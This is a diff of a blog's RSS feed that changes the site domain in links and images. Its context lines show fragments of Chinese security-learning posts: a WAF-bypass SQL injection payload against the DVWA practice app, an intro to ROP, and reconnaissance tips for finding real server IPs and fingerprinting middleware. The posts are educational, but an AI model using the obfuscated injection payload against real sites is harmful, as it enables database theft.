-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4.jpg&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4.jpg&#34;
 	width=&#34;1871&#34;
 	height=&#34;859&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1897,10 +1897,10 @@
 &lt;h4 id=&#34;round-1-替换空格&#34;&gt;Round 1: 替换空格&lt;/h4&gt;
 &lt;p&gt;把空格换成各种奇形怪状的格式，以及用注释替代空格&lt;/p&gt;
 &lt;p&gt;一个字，寄.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof.jpg&#34;
 	width=&#34;882&#34;
 	height=&#34;644&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;呜呜呜，别咬我了，疼疼疼&#34;
@@ -1922,10 +1922,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;...
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;id=1&amp;#39;+and+(/*!40000%53elect*//**/count(table_name)+from+information_schema.tables+where+table_schema=&amp;#39;dvwa&amp;#39;)=2%23&amp;amp;Submit=Submit
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6.jpg&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6.jpg&#34;
 	width=&#34;1883&#34;
 	height=&#34;862&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1943,11 +1943,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part6 --- ROP</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/</link>
         <pubDate>Thu, 14 Apr 2022 23:21:24 -0400</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part6 --- ROP" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part6&#34;&gt;PWN! PWN! PANG! Part6&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part6 --- ROP" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part6&#34;&gt;PWN! PWN! PANG! Part6&lt;/h1&gt;
 &lt;p&gt;呼～好久没有玩PWNPWN车了 &lt;del&gt;(又再次摆烂的PGR)&lt;/del&gt;&lt;/p&gt;
 &lt;p&gt;本篇文章给大家来谈谈ROP&lt;/p&gt;
 &lt;h2 id=&#34;什么是rop&#34;&gt;什么是ROP&lt;/h2&gt;
@@ -2006,10 +2006,10 @@
 &lt;p&gt;&lt;font size=2&gt;害，又是一个被骗入传销组织的小程序，可怜啊 bushi)&lt;/font&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;&lt;strong&gt;实际上, gadget可以理解成一个一个小的积木块，通过构造ROP链把一个个gadget拼凑起来，就构成了完成整个攻击流程的payload&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/1.jpg&#34;
 	width=&#34;517&#34;
 	height=&#34;661&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/1_huc2ddfc89603364ca85e0155ada406240_348427_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part6---rop/1_huc2ddfc89603364ca85e0155ada406240_348427_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/1_huc2ddfc89603364ca85e0155ada406240_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part6---rop/1_huc2ddfc89603364ca85e0155ada406240_348427_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;gadget和payload&#34;
@@ -2071,11 +2071,11 @@
         </item>
         <item>
         <title>Web安全:关于信息收集那些事</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/</link>
         <pubDate>Thu, 17 Mar 2022 00:23:45 -0400</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/cover.jpg" alt="Featured image of post Web安全:关于信息收集那些事" /&gt;&lt;h1 id=&#34;关于信息收集那些事&#34;&gt;关于信息收集那些事&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/cover.jpg" alt="Featured image of post Web安全:关于信息收集那些事" /&gt;&lt;h1 id=&#34;关于信息收集那些事&#34;&gt;关于信息收集那些事&lt;/h1&gt;
 &lt;p&gt;在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小(毕竟你找到的东西越多，可能出现漏洞的几率越大嘛= =)&lt;/p&gt;
 &lt;h2 id=&#34;判断有无cdn&#34;&gt;判断有无CDN&lt;/h2&gt;
 &lt;p&gt;基本上通过&lt;a class=&#34;link&#34; href=&#34;https://ping.chinaz.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -2089,7 +2089,7 @@
     &gt;DNS解析历史记录&lt;/a&gt;:有可能这个服务器之前没有配置CDN,查看历史DNS解析记录可以获得服务器真实IP&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.nanosec.site/posts/web2/#%e9%bb%91%e6%9a%97%e5%bc%95%e6%93%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;黑暗引擎&lt;/a&gt;搜索&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/web2/#%e9%bb%91%e6%9a%97%e5%bc%95%e6%93%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;黑暗引擎&lt;/a&gt;搜索&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;奇怪的&lt;code&gt;www.&lt;/code&gt;绕过:有可能某些网站CDN配置的时候忽视了一些细节(比如说带有&lt;code&gt;www.&lt;/code&gt;的域名配置了CDN.不带有&lt;code&gt;www.&lt;/code&gt;的没有)，部分网站可以用过ping去掉&lt;code&gt;www.&lt;/code&gt;的域名来找出服务器真实IP, 比如说著名的学而思网校的网站= =&lt;/p&gt;
@@ -2127,10 +2127,10 @@
 &lt;h2 id=&#34;判断waf&#34;&gt;判断WAF&lt;/h2&gt;
 &lt;p&gt;直接上工具: &lt;a class=&#34;link&#34; href=&#34;https://github.com/EnableSecurity/wafw00f&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;wafw00f&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png&#34;
 	width=&#34;1143&#34;
 	height=&#34;472&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_huf233d6e9d5c96a405d91ea5a28b64b13_315937_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_huf233d6e9d5c96a405d91ea5a28b64b13_315937_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_huf233d6e9d5c96a405d91ea5a28b64b13_315937_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_huf233d6e9d5c96a405d91ea5a28b64b13_315937_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;让我们直面WAF  (大雾&#34;
@@ -2169,10 +2169,10 @@
 &lt;ul&gt;
 &lt;li&gt;Linux: 64&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2.jpg&#34;
 	width=&#34;647&#34;
 	height=&#34;214&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2_hu226c9e5dc427c2353909a855d8ebec97_33274_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2_hu226c9e5dc427c2353909a855d8ebec97_33274_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2_hu226c9e5dc427c2353909a855d8ebec97_33274_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/2_hu226c9e5dc427c2353909a855d8ebec97_33274_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Linux下TTL值&#34;
@@ -2186,10 +2186,10 @@
 &lt;ul&gt;
 &lt;li&gt;Windows: 128&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1.jpg&#34;
 	width=&#34;643&#34;
 	height=&#34;217&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_hu2a4fba40eaf108bfe5304212b4993c71_348427_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_hu2a4fba40eaf108bfe5304212b4993c71_348427_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_hu2a4fba40eaf108bfe5304212b4993c71_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/1_hu2a4fba40eaf108bfe5304212b4993c71_348427_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Win下TTL值&#34;
@@ -2216,7 +2216,7 @@
 &lt;p&gt;这里的大小写敏感针对的是&lt;strong&gt;网站目录名&lt;/strong&gt;和&lt;strong&gt;提交给服务器的参数名&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;特定的中间件只能用于特定系统&#34;&gt;特定的中间件只能用于特定系统&lt;/h3&gt;
-&lt;p&gt;某些&lt;a class=&#34;link&#34; href=&#34;https://blog.nanosec.site/posts/web2/#%e5%85%b3%e4%ba%8e%e4%b8%ad%e9%97%b4%e4%bb%b6%e7%9a%84%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;中间件&lt;/a&gt;只能用于特定的操作系统，如IIS只能用于windows，nginx只能用于Linux&lt;/p&gt;
+&lt;p&gt;某些&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/web2/#%e5%85%b3%e4%ba%8e%e4%b8%ad%e9%97%b4%e4%bb%b6%e7%9a%84%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;中间件&lt;/a&gt;只能用于特定的操作系统，如IIS只能用于windows，nginx只能用于Linux&lt;/p&gt;
 &lt;h2 id=&#34;关于中间件的信息收集&#34;&gt;关于中间件的信息收集&lt;/h2&gt;
 &lt;h3 id=&#34;通过应答包判断&#34;&gt;通过应答包判断&lt;/h3&gt;
 &lt;p&gt;在应答包中可能会有server字段 &lt;strong&gt;(也就意味着可以后台手动去掉)&lt;/strong&gt; ，其中代表的则是所有的搭建平台(中间件)类型&lt;/p&gt;
@@ -2224,10 +2224,10 @@
 &lt;p&gt;如何找Server字段(?&lt;/p&gt;
 &lt;p&gt;去开发者工具里网络一栏，然后刷新界面&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3.jpg&#34;
 	width=&#34;1291&#34;
 	height=&#34;375&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3_hud1eac598ac4a994878ba911fe1ef8d05_66349_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3_hud1eac598ac4a994878ba911fe1ef8d05_66349_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3_hud1eac598ac4a994878ba911fe1ef8d05_66349_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/3_hud1eac598ac4a994878ba911fe1ef8d05_66349_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Server字段awa&#34;
@@ -2243,10 +2243,10 @@
 &lt;p&gt;比如:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://www.baidu.com/233333333333333333333333333
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;del&gt;别试了，百度的报错不包含中间件信息;)&lt;/del&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4.jpg&#34;
 	width=&#34;1287&#34;
 	height=&#34;286&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4_hu1c5cdd0784e1a12adbfbd19204c0a427_40733_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4_hu1c5cdd0784e1a12adbfbd19204c0a427_40733_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4_hu1c5cdd0784e1a12adbfbd19204c0a427_40733_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/4_hu1c5cdd0784e1a12adbfbd19204c0a427_40733_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嘿嘿，这才是真正的例子&#34;
@@ -2262,7 +2262,7 @@
     &gt;站长之家&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;关于数据库的信息收集&#34;&gt;关于数据库的信息收集&lt;/h2&gt;
 &lt;h3 id=&#34;黑暗引擎一把梭&#34;&gt;黑暗引擎一把梭&lt;/h3&gt;
-&lt;p&gt;见&lt;a class=&#34;link&#34; href=&#34;https://blog.nanosec.site/posts/web2/#%e9%bb%91%e6%9a%97%e5%bc%95%e6%93%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;上文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;见&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/web2/#%e9%bb%91%e6%9a%97%e5%bc%95%e6%93%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86&#34; &gt;上文&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;依据默认端口判断&#34;&gt;依据默认端口判断&lt;/h3&gt;
 &lt;p&gt;各数据库&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/zhangrenguo/p/10646116.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;默认端口&lt;/a&gt;&lt;/p&gt;
@@ -2274,10 +2274,10 @@
 &lt;h3 id=&#34;添加后缀法&#34;&gt;添加后缀法&lt;/h3&gt;
